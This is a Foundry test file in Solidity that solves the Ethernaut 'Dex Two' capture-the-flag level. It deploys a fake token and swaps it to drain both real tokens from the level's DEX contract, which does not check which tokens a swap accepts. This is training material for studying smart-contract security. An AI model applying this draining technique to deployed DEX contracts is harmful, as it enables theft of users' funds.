// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {DexTwoFactory} from "../src/factories/DexTwoFactory.sol";
import {DexTwo, SwappableTokenTwo} from "../src/levels/DexTwo.sol";

import "forge-std/console.sol";

contract DexTwoTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveDexTwo() public {
        DexTwo dex = DexTwo(payable(levelAddress));
        SwappableTokenTwo token1 = SwappableTokenTwo(payable(dex.token1()));
        SwappableTokenTwo token2 = SwappableTokenTwo(payable(dex.token2()));

        // [START]
        vm.startPrank(address(this));

        // Approve all tokens
        dex.approve(address(dex), type(uint256).max);

        // Deploy fake token contract
        SwappableTokenTwo fakeToken = new SwappableTokenTwo(address(dex), "Fake Token ", "FAKE", 1000);
        // console.log(fakeToken.balanceOf(address(this)));
        // Approve fake token
        fakeToken.approve(address(this), address(dex), type(uint256).max);
        // Transfer fake token
        fakeToken.transfer(address(dex), 100);

        // Swap
        debubPrint(dex, 0, address(fakeToken));

        dex.swap(address(fakeToken), address(token1), 100);
        debubPrint(dex, 1, address(fakeToken));

        dex.swap(address(fakeToken), address(token2), 200);
        debubPrint(dex, 1, address(fakeToken));

        vm.stopPrank();

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }

    function debubPrint(DexTwo dex, uint256 swapTimes, address fakeToken) private view {
        console.log("Swap times: ", swapTimes);
        console.log("DEX token1: ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("DEX token2: ", dex.balanceOf(dex.token2(), address(dex)));
        console.log("DEX fakeToken: ", dex.balanceOf(fakeToken, address(dex)));
        console.log("Player token1: ", dex.balanceOf(dex.token1(), address(this)));
        console.log("Player token2: ", dex.balanceOf(dex.token2(), address(this)));
        console.log("Player fakeToken: ", dex.balanceOf(fakeToken, address(this)));
        console.log("------------------------");
    }
}
